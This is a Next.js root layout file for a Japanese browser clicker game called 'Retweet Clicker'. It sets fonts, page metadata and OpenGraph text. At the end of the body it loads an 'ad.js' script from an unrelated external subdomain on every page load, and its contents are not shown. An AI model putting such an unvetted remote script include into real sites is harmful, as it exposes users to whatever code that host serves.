import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  icons: { icon: "/icon.svg" },
  title: "リツイートクリッカー",
  description: "リツイートをひたすらクリックするゲーム。アップグレードを購入してリツイート数を増やそう！",
  keywords: ["リツイートクリッカー", "クリッカーゲーム", "放置ゲーム", "ブラウザゲーム"],
  openGraph: {
    title: "リツイートクリッカー",
    description: "リツイートをひたすらクリックするゲーム。アップグレードを購入してリツイート数を増やそう！",
    type: "website",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="ja">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        {children}
              <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
      </body>
    </html>
  );
}
